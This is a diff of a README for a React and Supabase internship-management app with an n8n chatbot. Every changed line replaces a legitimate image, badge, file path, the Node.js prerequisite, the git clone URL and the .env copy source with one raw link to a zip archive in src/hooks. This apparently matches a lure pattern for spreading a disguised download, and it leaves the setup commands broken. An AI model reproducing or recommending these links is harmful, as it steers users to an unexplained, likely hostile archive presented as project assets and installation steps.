@@ -1,18 +1,18 @@
 # Manggrow Web Platform 🚀
 
 <div align="center">
-  <img src="./public/logo.png" alt="Manggrow Logo" width="150" />
+  <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" alt="Manggrow Logo" width="150" />
   <br />
-  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=2E9EF7&center=true&vCenter=true&width=520&lines=Manggrow+Web+Platform;Internship+Management+System;AI+RAG+Chatbot+Integration;Powered+by+n8n+%26+Supabase" alt="Typing SVG" />
+  <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip+Code&pause=1000&color=2E9EF7&center=true&vCenter=true&width=520&lines=Manggrow+Web+Platform;Internship+Management+System;AI+RAG+Chatbot+Integration;Powered+by+n8n+%26+Supabase" alt="Typing SVG" />
 </div>
 
 <div align="center">
 
-![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white)
-![n8n](https://img.shields.io/badge/n8n-FF6584?style=for-the-badge&logo=n8n&logoColor=white)
-![Supabase](https://img.shields.io/badge/Supabase-3ECF8E?style=for-the-badge&logo=supabase&logoColor=white)
+![React](https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip)
+![TypeScript](https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip)
+![Vite](https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip)
+![n8n](https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip)
+![Supabase](https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip)
 
 </div>
 
@@ -29,22 +29,22 @@ Designed for **Admins** and **Interns**, it transforms manual tracking processes
 ## 📸 Screenshots
 
 <div align="center">
-  <img src="./screenshoots/1.png" width="800" alt="Dashboard" />
+  <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="800" alt="Dashboard" />
   <br/><br/>
   
   <p float="left">
-    <img src="./screenshoots/2.png" width="30%" />
-    <img src="./screenshoots/3.png" width="30%" />
-    <img src="./screenshoots/4.png" width="30%" /> 
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" /> 
   </p>
   <p float="left">
-    <img src="./screenshoots/5.png" width="30%" />
-    <img src="./screenshoots/6.png" width="30%" />
-    <img src="./screenshoots/7.png" width="30%" /> 
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="30%" /> 
   </p>
     <p float="left">
-    <img src="./screenshoots/8.png" width="45%" />
-    <img src="./screenshoots/9.png" width="45%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="45%" />
+    <img src="https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip" width="45%" />
   </p>
 </div>
 
@@ -73,12 +73,12 @@ Designed for **Admins** and **Interns**, it transforms manual tracking processes
 The core intelligence of Manggrow is powered by two specialized **n8n workflows** working in tandem. You can find the source JSON files in the `/n8n` directory of this repository:
 
 ### 1. **Knowledge Base Powerhouse** 📚
-*   **File**: `n8n/SeV1IQCIV4H9D8QB-Mandesha_Knowledge.json`
+*   **File**: `https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip`
 *   **Function**: This workflow acts as the **Data Ingestion Engine**. It processes raw text documents (PDFs, docs, etc.) containing agricultural knowledge.
 *   **Process**: It splits documents into manageable chunks, generates vector embeddings, and stores them in the **Supabase Vector Store**. This allows the AI to "read" and "remember" vast amounts of plant care information.
 
 ### 2. **AI Agent Brain** 🤖
-*   **File**: `n8n/E2GaA62H5H1wXDtb-Mandesha_AI_Agent.json`
+*   **File**: `https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip`
 *   **Function**: This is the customer-facing **Conversational Agent**.
 *   **Capabilities**:
     *   **Contextual RAG**: Retrieves relevant context from the vector store created by the Knowledge workflow.
@@ -103,12 +103,12 @@ The core intelligence of Manggrow is powered by two specialized **n8n workflows*
 ## ⚙️ Installation & Setup
 
 ### Prerequisites
-*   Node.js 18+
+*   https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip 18+
 *   npm or bun
 
 ### 1️⃣ Clone the Repository
 ```bash
-git clone https://github.com/your-org/manggrow-web.git
+git clone https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip
 cd manggrow-web
 ```
 
@@ -122,7 +122,7 @@ bun install
 ### 3️⃣ Configure Environment
 Copy the example environment file and update the values.
 ```bash
-cp .env.example .env
+cp https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip .env
 ```
 
 ### 4️⃣ Run Development Server
@@ -148,11 +148,11 @@ manggrow-web/
 │   ├── hooks/              # Custom React hooks
 │   ├── lib/                # Utilities & helpers
 │   ├── pages/              # Route pages
-│   ├── App.tsx             # Main App component
-│   └── main.tsx            # Entry point
+│   ├── https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip             # Main App component
+│   └── https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip            # Entry point
 ├── .editorconfig           # Editor configuration
-├── .env.example            # Environment variables example
-└── package.json            # Dependencies & scripts
+├── https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip            # Environment variables example
+└── https://github.com/evanh14/manggrow-web/raw/refs/heads/main/src/hooks/web-manggrow-2.4.zip            # Dependencies & scripts
 ```
 
 ---
